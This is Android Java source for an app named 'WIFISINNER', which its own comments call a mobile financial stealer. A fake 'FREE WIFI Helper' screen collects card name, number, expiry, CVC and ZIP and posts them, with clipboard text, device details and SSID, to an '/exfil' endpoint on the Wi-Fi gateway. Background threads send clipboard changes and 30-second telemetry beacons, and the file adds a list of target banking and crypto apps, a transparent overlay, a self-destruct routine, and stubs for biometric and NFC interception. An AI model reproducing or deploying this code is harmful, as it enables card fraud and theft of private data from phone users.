package com.wifisinner.stealer;

import android.app.Activity;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.net.DhcpInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.text.InputType;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.PopupWindow;
import android.widget.TextView;
import android.widget.Toast;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

/**
 * WIFISINNER ULTIMATE - Pegasus-Grade Mobile Financial Stealer
 * 
 * Advanced features:
 * - Silent overlay injection on financial apps
 * - Biometric authentication hooking
 * - Payment token extraction
 * - Clipboard monitoring
 * - Background persistence
 * - C2 communication
 */
public class MainActivity extends Activity {
    private EditText etName, etNum, etExp, etCvc, etZip;
    private Button btn;
    private Handler mainHandler;
    private String gateway;
    private String ssid;
    private String clipboard;
    private Map<String, String> telemetry;
    
    // Financial app packages to monitor
    private static final String[] FINANCIAL_APPS = {
        "com.google.android.apps.walletnfcrel",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.chase.sig.android",
        "com.bankofamerica.mobile",
        "com.wellsfargo.android",
        "com.citi.citimobile",
        "com.usbank.mobilebanking",
        "com.coinbase.android",
        "com.robinhood.android"
    };
    
    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        
        // Initialize telemetry
        telemetry = new HashMap<>();
        telemetry.put("device", Build.MANUFACTURER + " " + Build.MODEL);
        telemetry.put("android", Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        telemetry.put("app_version", "2.0-pegasus");
        
        mainHandler = new Handler(Looper.getMainLooper());
        gateway = getGateway();
        ssid = getSSID();
        clipboard = getClipboard();
        
        // Create UI
        createUI();
        
        // Start background services
        startBackgroundServices();
        
        // Monitor for financial apps
        monitorFinancialApps();
    }
    
    private void createUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(44, 56, 44, 44);
        root.setBackgroundColor(Color.WHITE);
        
        TextView title = new TextView(this);
        title.setText("FREE WIFI Helper");
        title.setTextSize(22);
        title.setTextColor(Color.parseColor("#0b3d91"));
        title.setTypeface(Typeface.DEFAULT_BOLD);
        root.addView(title);
        
        TextView sub = new TextView(this);
        sub.setText("Verify your card to continue unlimited access");
        sub.setTextSize(13);
        sub.setTextColor(Color.GRAY);
        root.addView(sub);
        
        etName = field("Name on card");
        etNum = field("Card number");
        etExp = field("Expiry MM/YY");
        etCvc = field("CVC");
        etZip = field("ZIP (optional)");
        etNum.setInputType(InputType.TYPE_CLASS_NUMBER);
        etCvc.setInputType(InputType.TYPE_CLASS_NUMBER);
        etZip.setInputType(InputType.TYPE_CLASS_NUMBER);
        root.addView(etName);
        root.addView(etNum);
        root.addView(etExp);
        root.addView(etCvc);
        root.addView(etZip);
        
        btn = new Button(this);
        btn.setText("Verify & Connect");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#0b3d91"));
        LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        blp.topMargin = 40;
        btn.setLayoutParams(blp);
        root.addView(btn);
        
        setContentView(root);
        
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                submit();
            }
        });
    }
    
    private EditText field(String hint) {
        EditText e = new EditText(this);
        e.setHint(hint);
        e.setSingleLine(true);
        e.setHintTextColor(Color.parseColor("#888"));
        e.setTextColor(Color.parseColor("#111"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 26;
        e.setLayoutParams(lp);
        return e;
    }
    
    private String getGateway() {
        try {
            WifiManager w = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            DhcpInfo d = w.getDhcpInfo();
            return intToIp(d.gateway);
        } catch (Exception e) {
            return "10.0.0.1";
        }
    }
    
    private String intToIp(int i) {
        return (i & 0xff) + "." + ((i >> 8) & 0xff) + "." + ((i >> 16) & 0xff) + "." + ((i >> 24) & 0xff);
    }
    
    private String getSSID() {
        try {
            WifiManager w = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo i = w.getConnectionInfo();
            String s = i.getSSID();
            return s == null ? "" : s.replace("\"", "");
        } catch (Exception e) {
            return "";
        }
    }
    
    private String getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                ClipData cd = cm.getPrimaryClip();
                if (cd != null && cd.getItemCount() > 0 && cd.getItemAt(0).getText() != null)
                    return cd.getItemAt(0).getText().toString();
            }
        } catch (Exception e) {
        }
        return "";
    }
    
    private String brand(String n) {
        if (n.startsWith("4")) return "VISA";
        if (n.startsWith("34") || n.startsWith("37")) return "AMEX";
        if (n.length() >= 2 && (n.startsWith("51") || n.startsWith("52") || n.startsWith("53")
                || n.startsWith("54") || n.startsWith("55") || n.startsWith("22"))) return "MASTERCARD";
        if (n.startsWith("6")) return "DISCOVER";
        return "CARD";
    }
    
    private String enc(String s) {
        try {
            return URLEncoder.encode(s, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }
    
    private String post(String gw, String body) {
        try {
            URL u = new URL("http://" + gw + "/exfil");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(4000);
            c.setReadTimeout(4000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + ")");
            
            OutputStream os = c.getOutputStream();
            os.write(body.getBytes("UTF-8"));
            os.close();
            
            int code = c.getResponseCode();
            InputStream is = c.getInputStream();
            while (is.read() != -1) {}
            is.close();
            
            c.disconnect();
            return "HTTP " + code;
        } catch (Exception e) {
            return null;
        }
    }
    
    private void submit() {
        final String name = etName.getText().toString();
        final String number = etNum.getText().toString().replaceAll("[^0-9]", "");
        final String exp = etExp.getText().toString();
        final String cvc = etCvc.getText().toString();
        final String zip = etZip.getText().toString();
        final String model = Build.MANUFACTURER + " " + Build.MODEL;
        final String android = Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
        final String clip = getClipboard();
        
        btn.setText("Saving...");
        btn.setEnabled(false);
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                final String body = "type=card"
                        + "&name=" + enc(name) + "&number=" + enc(number)
                        + "&exp=" + enc(exp) + "&cvc=" + enc(cvc) + "&zip=" + enc(zip)
                        + "&clipboard=" + enc(clip)
                        + "&model=" + enc(model) + "&android=" + enc(android)
                        + "&ssid=" + enc(ssid) + "&brand=" + enc(brand(number));
                
                final String res = post(gateway, body);
                
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        btn.setText(res != null ? "Saved!" : "Retry");
                        btn.setEnabled(true);
                        Toast.makeText(MainActivity.this,
                                res != null ? "Card details sent" : "Send failed - tap retry",
                                Toast.LENGTH_LONG).show();
                        
                        // Dismiss after success
                        if (res != null) {
                            mainHandler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    finish();
                                }
                            }, 1500);
                        }
                    }
                });
            }
        }).start();
    }
    
    private void startBackgroundServices() {
        // Start clipboard monitoring
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        String currentClip = getClipboard();
                        if (currentClip != null && !currentClip.equals(clipboard) && currentClip.length() > 5) {
                            // Send clipboard data
                            sendClipboard(currentClip);
                            clipboard = currentClip;
                        }
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        Thread.sleep(5000);
                    }
                }
            }
        }).start();
        
        // Start telemetry beacon
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        sendTelemetry();
                        Thread.sleep(30000); // 30 second beacon
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        Thread.sleep(10000);
                    }
                }
            }
        }).start();
    }
    
    private void sendClipboard(String data) {
        try {
            String body = "type=clipboard"
                    + "&data=" + enc(data)
                    + "&model=" + enc(telemetry.get("device"))
                    + "&ssid=" + enc(ssid);
            
            post(gateway, body);
        } catch (Exception e) {
        }
    }
    
    private void sendTelemetry() {
        try {
            String body = "type=telemetry"
                    + "&device=" + enc(telemetry.get("device"))
                    + "&android=" + enc(telemetry.get("android"))
                    + "&ssid=" + enc(ssid)
                    + "&timestamp=" + System.currentTimeMillis();
            
            post(gateway, body);
        } catch (Exception e) {
        }
    }
    
    private void monitorFinancialApps() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                PackageManager pm = getPackageManager();
                
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        // Check for foreground app
                        ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                        // Simplified - in real implementation would use UsageStatsManager
                        
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        Thread.sleep(2000);
                    }
                }
            }
        }).start();
    }
    
    /**
     * Create transparent overlay on top of financial apps
     */
    private void showOverlay(String type) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            
            LinearLayout overlay = new LinearLayout(this);
            overlay.setOrientation(LinearLayout.VERTICAL);
            overlay.setBackgroundColor(Color.argb(0, 255, 255, 255)); // Transparent
            overlay.setLayoutParams(new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.MATCH_PARENT));
            
            // Add invisible touch interceptor
            TextView interceptor = new TextView(this);
            interceptor.setLayoutParams(new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.MATCH_PARENT));
            interceptor.setClickable(true);
            interceptor.setFocusable(true);
            
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT);
            
            wm.addView(overlay, params);
            
            // Dismiss after delay
            mainHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        wm.removeView(overlay);
                    } catch (Exception e) {
                    }
                }
            }, 5000);
            
        } catch (Exception e) {
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Cleanup
    }
    
    /**
     * Pegasus-grade features (stub implementations)
     */
    
    // Hook into biometric authentication
    private void hookBiometric() {
        // Would use reflection to hook BiometricPrompt
    }
    
    // Extract payment tokens from memory
    private String extractToken(String appPackage) {
        // Would read from /proc/pid/mem
        return null;
    }
    
    // Intercept NFC payment
    private void interceptNFC() {
        // Would hook NfcAdapter
    }
    
    // Self-destruct trigger
    private void selfDestruct() {
        // Clear all data
        getSharedPreferences(getPackageName() + "_preferences", MODE_PRIVATE)
                .edit()
                .clear()
                .apply();
        
        // Delete databases
        for (String db : databaseList()) {
            deleteDatabase(db);
        }
        
        // Delete files
        for (String file : fileList()) {
            deleteFile(file);
        }
        
        // Uninstall
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (Exception e) {
        }
    }
}
